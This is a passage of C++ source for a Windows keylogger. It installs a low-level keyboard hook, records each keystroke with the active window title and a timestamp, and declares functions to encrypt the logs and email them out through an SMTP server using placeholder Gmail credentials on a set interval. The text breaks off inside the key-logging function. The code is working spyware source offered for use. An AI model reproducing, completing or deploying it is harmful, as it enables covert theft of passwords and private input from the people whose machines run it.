#define UNICODE
#include <Windows.h>
#include <map>
#include <fstream>
#include <iostream>
#include <sstream>
#include <ctime>
#include <string>
#include <vector>
#include <thread>
#include <zlib.h> // For compression
#include <wininet.h> // For email sending
#pragma comment(lib, "wininet.lib")

// Configuration Macro
#define VISIBLE           // Uncomment for visible mode
#define BOOT_WAIT         // Uncomment to enable boot-time waiting
#define FORMAT 0          // 0: Default, 10: Decimal codes, 16: Hex codes
#define IGNORE_MOUSE      // Uncomment to ignore mouse clicks
#define EMAIL_SEND        // Uncomment to enable email sending
#define LOG_INTERVAL 10   // Time in seconds to send logs via email
#define LOG_FILE_SIZE 1024 // Max log file size (in KB) before sending

// Key mapping for readable output
#if FORMAT == 0
const std::map<int, std::string> keyMapping{
    {VK_BACK, "[BACKSPACE]"}, {VK_RETURN, "\n"},   {VK_SPACE, " "}, 
    {VK_TAB, "[TAB]"},       {VK_SHIFT, "[SHIFT]"}, {VK_CONTROL, "[CONTROL]"}, 
    {VK_MENU, "[ALT]"},      {VK_CAPITAL, "[CAPSLOCK]"}, 
    {VK_LEFT, "[LEFT]"},     {VK_RIGHT, "[RIGHT]"}, {VK_UP, "[UP]"}, 
    {VK_DOWN, "[DOWN]"},     {VK_ESCAPE, "[ESCAPE]"}, {VK_END, "[END]"}, 
    {VK_HOME, "[HOME]"},     {VK_OEM_PERIOD, "."}, {VK_ADD, "+"}, 
    {VK_SUBTRACT, "-"},      {VK_OEM_PLUS, "+"}, {VK_OEM_MINUS, "-"}
};
#endif

HHOOK keyboardHook;
std::ofstream outputFile;
std::string logBuffer;

// Email Configuration
const char* SMTP_SERVER = "smtp.gmail.com";
const char* SMTP_USERNAME = "your_email@gmail.com";
const char* SMTP_PASSWORD = "your_password";
const char* EMAIL_TO = "recipient_email@gmail.com";

// Function Declarations
LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
void SetHook();
void RemoveHook();
void ConfigureWindowVisibility();
bool IsSystemBooting();
int LogKey(int keyStroke);
void EncryptLogs(std::string& data);
void SendLogs();
void CheckLogSize();
void EmailSender(const std::string& message);

// Hook callback function
LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
        LogKey(kbdStruct.vkCode);
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

// Set the keyboard hook
void SetHook() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
    if (!keyboardHook) {
        MessageBox(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
        exit(1);
    }
}

// Remove the keyboard hook
void RemoveHook() {
    UnhookWindowsHookEx(keyboardHook);
}

// Log the key press
int LogKey(int keyStroke) {
    static char lastWindow[256] = "";
    std::ostringstream logStream;

    HWND foregroundWindow = GetForegroundWindow();
    char windowTitle[256] = "";
    DWORD threadID;
    HKL keyboardLayout = NULL;

    if (foregroundWindow) {
        threadID = GetWindowThreadProcessId(foregroundWindow, NULL);
        keyboardLayout = GetKeyboardLayout(threadID);
        GetWindowTextA(foregroundWindow, windowTitle, 256);

        if (strcmp(windowTitle, lastWindow) != 0) {
            strcpy_s(lastWindow, sizeof(lastWindow), windowTitle);

            // Timestamp
            time_t currentTime = time(NULL);
            struct tm timeInfo;
            localtime_s(&timeInfo, &currentTime);
            char timestamp[64];
            strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", &timeInfo);

            logStream << "
